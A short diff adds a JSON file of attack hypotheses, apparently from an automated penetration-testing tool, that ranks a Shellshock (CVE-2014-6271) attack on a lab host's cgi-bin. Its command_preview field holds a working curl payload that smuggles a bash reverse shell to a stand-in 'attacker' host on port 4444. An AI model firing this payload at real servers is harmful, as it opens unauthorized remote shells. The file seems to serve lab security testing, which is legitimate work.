@@ -1,0 +1,18 @@
+{
+  "hypotheses": [
+    {
+      "rank": 1,
+      "target": "10.10.10.56",
+      "technique": "Shellshock (CVE-2014-6271)",
+      "cve": "CVE-2014-6271",
+      "expected_outcome": "RCE as www-data via cgi-bin",
+      "tool": "custom",
+      "tool_module": null,
+      "confidence": 0.9,
+      "rationale": "Apache httpd 2.2.22 with /cgi-bin/ directory discovered. Shellshock affects bash < 4.3.",
+      "prerequisites": ["http service accessible", "cgi-bin path discoverable"],
+      "risks": ["may crash apache worker"],
+      "command_preview": "curl -H 'User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/attacker/4444 0>&1' http://10.10.10.56/cgi-bin/test.sh"
+    }
+  ]
+}
